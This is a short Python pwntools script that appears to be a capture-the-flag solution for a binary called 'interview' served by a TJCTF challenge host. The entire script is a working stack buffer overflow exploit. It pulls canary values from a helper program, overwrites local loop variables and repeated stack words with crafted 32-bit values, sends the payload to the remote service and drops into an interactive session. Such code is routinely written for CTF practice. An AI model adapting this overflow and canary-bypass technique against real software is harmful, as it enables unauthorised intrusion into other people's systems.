from pwn import *
import subprocess

context.log_level = 'debug'
context.binary = './interview'

# sh = process('./interview')
sh = remote('problem1.tjctf.org', 8000)

r = list(map(lambda x: p32(int(x)), subprocess.check_output(["./exploit", '0']).strip().split(' ')))

payload = 'a'*64 # pad
payload += ''.join(r) # canary
payload += p32(0x01010101) # j
payload += p32(0x01010101) # i
for i in range(20):
  payload += p32(3752771558)

sh.sendlineafter('?\n', payload)
sh.interactive()
